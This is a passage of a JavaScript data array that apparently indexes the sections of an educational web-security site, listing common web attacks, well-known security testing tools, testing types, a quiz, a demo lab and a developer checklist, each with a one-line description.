  { id: "s-xss", title: "Cross-Site Scripting (XSS)", type: "Attack", description: "Injecting malicious JavaScript into web pages", sectionId: "attacks" },
  { id: "s-csrf", title: "Cross-Site Request Forgery (CSRF)", type: "Attack", description: "Forging requests on behalf of authenticated users", sectionId: "attacks" },
  { id: "s-brute", title: "Brute Force Attack", type: "Attack", description: "Automated credential guessing attempts", sectionId: "attacks" },
  { id: "s-broken-auth", title: "Broken Authentication", type: "Attack", description: "Session and token validation flaws", sectionId: "attacks" },
  { id: "s-clickjack", title: "Clickjacking", type: "Attack", description: "UI redress attack using invisible iframes", sectionId: "attacks" },
  
  { id: "s-zap", title: "OWASP ZAP", type: "Tool", description: "Free open-source web application scanner", sectionId: "tools" },
  { id: "s-burp", title: "Burp Suite", type: "Tool", description: "Web proxy and penetration testing suite", sectionId: "tools" },
  { id: "s-nessus", title: "Nessus", type: "Tool", description: "Infrastructure vulnerability assessment scanner", sectionId: "tools" },
  { id: "s-nmap", title: "Nmap", type: "Tool", description: "Network port and service discovery tool", sectionId: "tools" },
  { id: "s-wireshark", title: "Wireshark", type: "Tool", description: "Network protocol packet sniffer", sectionId: "tools" },
  { id: "s-metasploit", title: "Metasploit", type: "Tool", description: "Penetration testing exploit framework", sectionId: "tools" },

  { id: "s-vuln-scan", title: "Vulnerability Scanning", type: "Type", description: "Automated scan for known security flaws", sectionId: "types" },
  { id: "s-pen-test", title: "Penetration Testing", type: "Type", description: "Simulated ethical attack on systems", sectionId: "types" },
  { id: "s-auth-test", title: "Authentication Testing", type: "Type", description: "Testing logins and password strength", sectionId: "types" },
  { id: "s-authz-test", title: "Authorization Testing", type: "Type", description: "Testing role permissions & IDOR", sectionId: "types" },
  
  { id: "s-quiz", title: "10-Question Security Quiz", type: "Topic", description: "Test your cybersecurity knowledge", sectionId: "quiz" },
  { id: "s-lab", title: "Interactive Demo Lab", type: "Topic", description: "Hands-on safe simulations of SQLi, XSS, and passwords", sectionId: "demolab" },
  { id: "s-checklist", title: "Best Practices Checklist", type: "Practice", description: "Security guidelines for developers", sectionId: "bestpractices" }
];
